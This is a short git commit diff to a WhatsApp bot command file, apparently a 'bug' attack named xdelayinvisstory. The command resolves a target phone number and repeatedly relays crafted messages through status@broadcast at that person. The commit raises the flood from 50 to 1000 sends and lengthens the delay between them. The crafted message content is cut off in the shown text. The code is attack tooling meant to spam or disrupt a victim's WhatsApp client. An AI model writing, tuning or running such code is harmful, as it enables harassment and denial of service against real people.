ab2befeff685158af30b92eb28d270ba569bbf11
kingranzz <156513688+kingranzz@users.noreply.github.com>
2025-03-23 00:44:41 +0800

    Update xdelayinvisstory.js

--- commands/bugs/xdelayinvisstory.js
+++ commands/bugs/xdelayinvisstory.js
@@ -15,9 +15,9 @@ export default {
     const jid = (await sock.onWhatsApp(`${number}@s.whatsapp.net`))[0]?.jid;
     if (!jid) return m.replyError(`${m.args[0]} tidak terdaftar diwhatsapp`);
     await m.reply(global.mess.spam);
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 1000; i++) {
       try {
-        await utils.sleep(5);
+        await utils.sleep(500);
         await sock.relayMessage(
           "status@broadcast",
           {
